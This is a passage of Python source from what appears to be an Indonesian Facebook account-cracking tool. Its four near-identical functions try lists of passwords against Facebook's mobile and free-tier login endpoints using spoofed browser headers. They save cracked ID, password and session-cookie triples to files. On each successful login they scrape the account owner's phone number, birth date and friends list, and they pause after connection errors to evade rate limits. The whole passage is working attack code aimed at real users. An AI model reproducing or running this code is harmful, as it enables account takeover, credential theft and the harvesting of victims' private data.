					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
	
#--------------------[ METODE MBASIC ]-----------------#
def crackmbasicdate(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Basic [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ua = uaasepitgansxc()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackmbasicreg(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Basic Reguler [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ua = uaasepitgansxc()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

#--------------------[ METODE FREE ]-----------------#
def crackfreedate(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Free [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ua = uaasepitgansxc()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackfreereg(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Free Reguler [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ua = uaasepitgansxc()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{reguler()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
